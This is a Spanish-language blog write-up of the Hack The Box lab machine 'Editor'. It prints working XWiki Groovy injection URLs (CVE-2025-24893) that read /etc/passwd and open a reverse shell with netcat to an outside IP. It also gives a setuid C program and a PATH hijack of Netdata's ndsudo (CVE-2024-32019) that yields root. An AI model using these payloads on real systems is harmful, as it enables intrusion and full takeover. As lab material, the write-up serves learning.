---
date: '2025-08-06T15:26:48Z'
draft: false
title: 'HTB: Editor'
tags: ["hacking"]
---

# Algunas notas sobre la máquina [Editor](https://app.hackthebox.com/machines/684) de [Hack The Box](https://www.hackthebox.com/)

## Acceso

La intrusión la realicé aprovechando la vulnerabilidad [CVE-2025-24893](https://nvd.nist.gov/vuln/detail/CVE-2025-24893) en la página web. Después de analizar este [PoC](https://www.exploit-db.com/exploits/52136), comencé a probar con distintos payloads:

```bash
# CVE-2025-24893
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println("cat /etc/passwd".execute().text){{/groovy}}{{/async}}

http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println("whoami".execute().text){{/groovy}}{{/async}}

http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println("busybox nc 10.10.15.14 443 -e bash".execute().text){{/groovy}}{{/async}}
```

Esto me dio acceso al equipo como el usuario `xwiki`.

---

## Reseteo de contraseña para el usuario `neal`

Buscando credenciales, encontré en **/var/lib/xwiki/data/mails/** que, si desde la web se hacía una petición para cambiar la clave de un usuario válido, el sistema enviaba un correo con un link para restablecer la contraseña.

Así fue como pude cambiar la clave del usuario `neal` y acceder a la wiki. Dentro del servicio no encontré nada útil, pero me pareció interesante ver cómo funciona por detrás esta parte del sistema.

### Link de ejemplo que envia el sistema

```
http://editor.htb:8080/xwiki/authenticate/wiki/xwiki/resetpassword?u=xwiki:XWiki.neal&v=BpqfjCA4Ig0NvmvmoduOVq05oUkX7z
```

---

## Root

Una vez dentro del equipo como el usuario `oliver`, listé los binarios con permisos SUID y me llamó la atención esta línea:

```bash
find / -perm -4400 -type f 2>/dev/null 
# --> /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

Buscando información, encontré el [CVE-2024-32019](https://nvd.nist.gov/vuln/detail/CVE-2024-32019) y estas páginas que explican cómo explotarlo:

- [netdata](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93)
- [sploitus](https://sploitus.com/exploit?id=5077683C-F7E6-58BE-9375-B5A13A8782C5)

Entonces cree el archivo poc.c con el siguiente contenido

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>

int main()
{
        setuid(geteuid());
        system("/bin/bash");
        return 0;
}
```

lo compile

```bash
gcc poc.c -o nvme
```

y finalmente, ejecuté el siguiente comando para convertirme en `root`:

```bash
# CVE-2024-32019
PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

saludos!!
